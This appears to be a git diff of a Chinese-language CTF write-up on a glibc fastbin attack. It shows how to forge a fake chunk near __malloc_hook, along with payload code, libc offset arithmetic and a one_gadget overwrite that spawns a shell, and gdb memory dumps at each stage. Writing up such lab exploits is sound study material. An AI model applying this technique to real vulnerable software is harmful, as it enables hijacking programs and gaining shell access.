@@ -47,7 +47,7 @@ gdb-peda$ x /64wx 0x555555757060
 ```
 
 #### 第二步
-将chunk1和chunk2链在fastbin链表上，此时： fastbin->chunk2,chunk2->fd->chunk1
+将chunk1和chunk2链在fastbin链表上，此时： fastbin -> chunk2,chunk2->fd -> chunk1
 ```
 #为了将 chunk4(smallbin) 放在fastbin的链表上 
 free(1)
@@ -78,8 +78,8 @@ Fastbin0 :
 
 #### 第三步
 破坏fastbin的链表<br>
-原本:fastbin->chunk2, chunk2->fd->chunk1<br>
-破坏后:fastbin->chunk2, chunk2->fd->chunk4<br>
+原本:fastbin -> chunk2, chunk2->fd -> chunk1<br>
+破坏后:fastbin -> chunk2, chunk2->fd -> chunk4<br>
 ```
 payload ='A'*0x10 #the data of chunk0
 payload+=p64(0) + p64(0x21) + 'A'*0x10 #chunk1
@@ -344,7 +344,7 @@ void *(*hook) (size_t, const void *)
 if (__builtin_expect (hook != NULL, 0))
     return (*hook)(bytes, RETURN_ADDRESS (0));
 ```
-如果要写malloc,必须想办法在__malloc_hook附近根据现有条件伪造一个fastbin，这个时候观察
+如果要写malloc,必须想办法在__malloc_hook附近根据现有条件伪造一个fastbin，这个时候观察0x7ffff7bcbaf0附近，有一个高位的0x7f,可以通过偏移构造出0x0000007f这样的size,从而构造出一个fake fastbin chunk
 ```
 gdb-peda$ x /64wx (long long)&main_arena -0x50
 0x7ffff7bcbad0 <_IO_wide_data_0+272>:	0x00000000	0x00000000	0x00000000	0x00000000
@@ -359,13 +359,84 @@ gdb-peda$ x /64wx (long long)&main_arena -0x50
 0x7ffff7bcbb60 <main_arena+64>:	0x00000000	0x00000000	0x00000000	0x00000000
 0x7ffff7bcbb70 <main_arena+80>:	0x00000000	0x00000000	0x55762340	0x00005555
 0x7ffff7bcbb80 <main_arena+96>:	0x557571d0	0x00005555	0x557570c0	0x00005555
-0x7ffff7bcbb90 <main_arena+112>:	0x557570c0	0x00005555	0xf7bcbb88	0x00007fff
-0x7ffff7bcbba0 <main_arena+128>:	0xf7bcbb88	0x00007fff	0xf7bcbb98	0x00007fff
-0x7ffff7bcbbb0 <main_arena+144>:	0xf7bcbb98	0x00007fff	0xf7bcbba8	0x00007fff
-0x7ffff7bcbbc0 <main_arena+160>:	0xf7bcbba8	0x00007fff	0xf7bcbbb8	0x00007fff
+```
+换个角度看0x7ffff7bcbaed这个地方可以构造出一个fake fastbin chunk
+```
+gdb-peda$ x /64wx (long long)&main_arena -0x50 +0xd
+0x7ffff7bcbadd <_IO_wide_data_0+285>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbaed <_IO_wide_data_0+301>:	0x60000000	0xfff7bca2	0x0000007f	0x00000000
+0x7ffff7bcbafd:	0x20000000	0xfff788ce	0x0000007f	0xfff788ca
+0x7ffff7bcbb0d <__realloc_hook+5>:	0x0000007f	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbb1d:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbb2d <main_arena+13>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbb3d <main_arena+29>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbb4d <main_arena+45>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbb5d <main_arena+61>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbb6d <main_arena+77>:	0x00000000	0x00000000	0x40000000	0x55557623
+0x7ffff7bcbb7d <main_arena+93>:	0xd0000055	0x55557571	0xc0000055	0x55557570
+```
+### 具体实现
+#### 核心思路
+和泄露libc的第一种方式很类似。
+1.申请三个和0x7f一样大的chunksize,chunk0/chunk1/chunk2
+2.free(chunk1&&chunk2)
+3.破坏fastbin链,此时的fastbin链是：fastbin -> chunk2;chunk2->fd -> chunk1。<br>
+破坏之后的fastbin链是：fastbin -> chunk2; chunk2->fd ->__mlloc_hook<br>
+4.然后alloc，malloc的时候会检查chunksize，0x7f的chunksize根据上面的计算，`((0x7f xor 0x3)>>4) - 2 = 5`,`((0x71 xor 0x3)>>4) -2 = 5`<br> 
+所以申请0x60大小的chunk就可以了，第二次malloc的时候就可以将__malloc_hook申请出来<br>
+然后往__malloc_hook地方写one_gadget找到的execve("/bin/sh")的地址，就能getshell了
+#### 第一步：上链
+```
+alloc(0x60) #chunk4
+alloc(0x60) #chunk5
+alloc(0x60) #chunk6
+free(5)
+free(6)
+
+gdb-peda$ heap fastbin
+FASTBINS:
+Fastbin5 : 
+0x5555557571c0 SIZE=0x70 DATA[0x5555557571d0] |PquUUU..........................| INUSED PREV_INUSE      -->chunk6
+0x555555757150 SIZE=0x70 DATA[0x555555757160] |................................| INUSED PREV_INUSE      -->chunk5
+```
+#### 第二步：破链
+```
+payload='A'*0x60 + p64(0) + p64(0x71) + 'A'*0x60 + p64(0) + p64(0x71) + p64(main_arena-0x8b)
+fill(4, payload)
+
+gdb-peda$ heap fastbin
+FASTBINS:
+Fastbin5 : 
+0x5555557571c0 SIZE=0x70 DATA[0x5555557571d0] |................................| INUSED PREV_INUSE      -->chunk6
+0x7ffff7bcbaed SIZE=0x78 DATA[0x7ffff7bcbafd] |... ............................| IS_MMAPED              -->fake chunk(malloc_hook)
+invalid fastbin->fd: 0x7ffff7bcbaed->0x-87731e0000000
+```
+#### 第三步：alloc&&fill
+通过alloc获取__malloc_hook这个fake chunk，然后通过fill去填充__malloc_hook,加上计算各种地址
+```
+libc_base=main_arena-0x3c4b20-0x58
+success(hex(libc_base))
+execve_addr = libc_base + 0x4526a
+payload='A'*19 + p64(execve_addr)
+fill(6,payload)
+
+alloc(0x10) -->execve("/bin/sh")
+
+
+gdb-peda$ x /64wx (long long)&main_arena -0x50
+0x7ffff7bcbad0 <_IO_wide_data_0+272>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbae0 <_IO_wide_data_0+288>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbaf0 <_IO_wide_data_0+304>:	0xf7bca260	0x00007fff	0x00000000	0x41414100
+0x7ffff7bcbb00 <__memalign_hook>:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7ffff7bcbb10 <__malloc_hook>:	0xf784c26a	0x00007fff	0x00000000	0x00000000      -->the addr of execve("/bin/sh")
+0x7ffff7bcbb20 <main_arena>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbb30 <main_arena+16>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbb40 <main_arena+32>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7ffff7bcbb50 <main_arena+48>:	0x20000000	0xfff788ce	0x00000000	0x00000000
 ```
 
-
-
-https://dangokyo.me/2017/12/12/introduction-on-ptmalloc-part-2/
+# 参考的各个师傅的blog，感谢各位师傅
+gd师傅（链表指向泄露libc）：https://bbs.pediy.com/thread-223461.htm
+Anciety师傅（包含泄露libc）：https://blog.csdn.net/qq_29343201/article/details/66476135
+dangokyo师傅（malloc&&free解读，包括安全机制）https://dangokyo.me/2017/12/12/introduction-on-ptmalloc-part-2/
 
